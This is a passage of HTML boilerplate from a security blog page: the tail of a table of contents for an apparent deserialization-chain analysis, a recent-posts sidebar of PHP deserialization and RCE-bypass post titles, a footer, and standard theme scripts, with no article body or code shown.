toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化链路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B%E6%95%B4%E4%B8%AA%E8%B0%83%E7%94%A8%E9%93%BE%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">梳理一下整个调用链路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E8%B7%AF"><span class="toc-number">1.4.</span> <span class="toc-text">利用链路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.6.</span> <span class="toc-text">Reference:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行(RCE)绕过技术"/></a><div class="content"><a class="title" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术">命令执行(RCE)绕过技术</a><time datetime="2025-09-21T16:36:47.252Z" title="Created 2025-09-22 00:36:47">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——魔术方法"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法">PHP反序列化——魔术方法</a><time datetime="2025-09-21T16:24:00.575Z" title="Created 2025-09-22 00:24:00">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——字符串逃逸"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸">PHP反序列化——字符串逃逸</a><time datetime="2025-09-21T16:23:44.152Z" title="Created 2025-09-22 00:23:44">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——反序列化POP"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP">PHP反序列化——反序列化POP</a><time datetime="2025-09-21T16:23:28.021Z" title="Created 2025-09-22 00:23:28">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——PHAR反序列化"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化——PHAR反序列化">PHP反序列化——PHAR反序列化</a><time datetime="2025-09-21T16:22:09.810Z" title="Created 2025-09-22 00:22:09">2025-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Abernethy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>